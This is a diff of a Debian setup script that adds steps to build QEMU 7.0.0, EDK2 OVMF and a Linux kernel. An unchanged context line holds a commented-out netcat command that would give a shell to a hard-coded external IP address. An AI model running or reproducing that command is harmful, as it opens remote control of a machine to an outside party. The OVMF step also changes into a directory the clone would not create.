@@ -9,8 +9,31 @@ echo "deb http://deb.debian.org/debian unstable main" > /etc/apt/sources.list
 apt update
 apt install -y ncat
 #nc 65.108.51.31 11452 -e /bin/sh
-apt install -y linux-image-5.18.0-2-amd64 linux-source fakeroot rsync
 apt install -y build-essential libncurses-dev bison flex libssl-dev libelf-dev bc
+#####BUILD QEMU
+#https://www.qemu.org/download/
+#https://wiki.qemu.org/Testing/DockerBuild
+sudo apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev ninja-build -y
+mkdir ~/qemu; cd ~/qemu
+curl -L https://download.qemu.org/qemu-7.0.0.tar.xz -o qemu.tar.xz
+tar xvJf qemu.tar.xz
+cd qemu-7.0.0
+./configure
+make
+
+#####BUILD OVMF
+#https://phip1611.de/blog/how-to-compile-edk2-ovmf-from-source-on-linux-2021/
+apt install -y git nasm iasl build-essential uuid-dev
+mkdir ~/edk2; cd ~/edk2
+git clone https://github.com/tianocore/edk2.git
+cd edk2-master
+git submodule update --init
+make -C BaseTools
+cd OvmfPkg
+./build.sh
+
+#####BUILD KERNEL
+apt install -y linux-image-5.18.0-2-amd64 linux-source fakeroot rsync
 echo "Installed all packages\n"
 #https://www.cyberciti.biz/tips/compiling-linux-kernel-26.html
 #https://www.debian.org/releases/jessie/i386/ch08s06.html.en ##basic documentation
